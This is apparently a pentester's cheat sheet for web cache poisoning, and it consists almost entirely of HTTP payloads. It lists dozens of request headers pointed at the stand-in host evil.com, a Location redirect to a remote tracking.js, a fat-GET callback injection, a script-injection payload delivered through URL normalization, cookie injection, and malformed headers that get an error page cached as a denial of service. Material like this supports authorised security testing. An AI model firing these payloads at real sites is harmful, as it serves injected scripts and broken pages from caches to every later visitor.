# Cache Poisoning

> Header Response: X-Cache: hit, Body Response: evil.com

## Header Inject
```http
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Server: evil.com
X-Host: evil.com
\: evil.com
User-Agent: evil.com
X-Original-Url: evil.com
X-Forwarded-Proto: evil.com
X-Original-URL: evil.com
X-Get-Cache-Key: evil.com
Accept-Version: evil.com
Acunetix-Header: evil.com
Api-Version: evil.com
Content-Type: evil.com
Fastly-Client-Ip: evil.com
Fastly-Ff: evil.com
Fastly-Host: evil.com
Fastly-Ssl: evil.com
Trailer: evil.com
X-Amz-Server-Side-Encryption: evil.com
X-forwarded-Prefix: evil.com
X-Original-Host: evil.com
Handle: evil.com
X-Rewrite-url: evil.com
Authorization: evil.com
X-Amz-website-Redirect-Location: evil.com
X-Http-Method-Override: evil.com
X-Forwarded-Proto: evil.com
Capitalized host header: evil.com
```
### Location Attack
```http
Header Request
X-Forwarded-Scheme: http
X-Forwarded-Prefix: evil.com
```
```http
Header Response
Location: http://evil.com/tracking.js
```

### Fat GET Request
```http
GET /js/geolocate.js?callback=setCountryCookie
callback=arbitraryFunction
```
```http
HTTP/1.1 200 OK
BODY
arbitraryFunction({"country" : "United Kingdom"})
```

### URL Normalization
```http
GET /random</p><script>alert(1)</script>
```
```http
HTTP/1.1 404 not found
BODY
<p>
  File /random not found
</p>
</p>
  <script>alert(1)
</script>
```

## Cookie Inject
```http
Cookie: feHost=something/evil.com
```

## DOS attack
```http
X-Forwarded-Port: 123
X-Forwarded-Port: 123 
Transfer-Encoding: 123
zTRANSFER-ENCODING: dgsht --> HTTP/1.1 501 NOT_IMPLEMENTED
```
```http
Header Response
HTTP/2 400
X-Cache: hit
```

## Burp Suite Extension
Guess Headers!
Guess Eviriting!
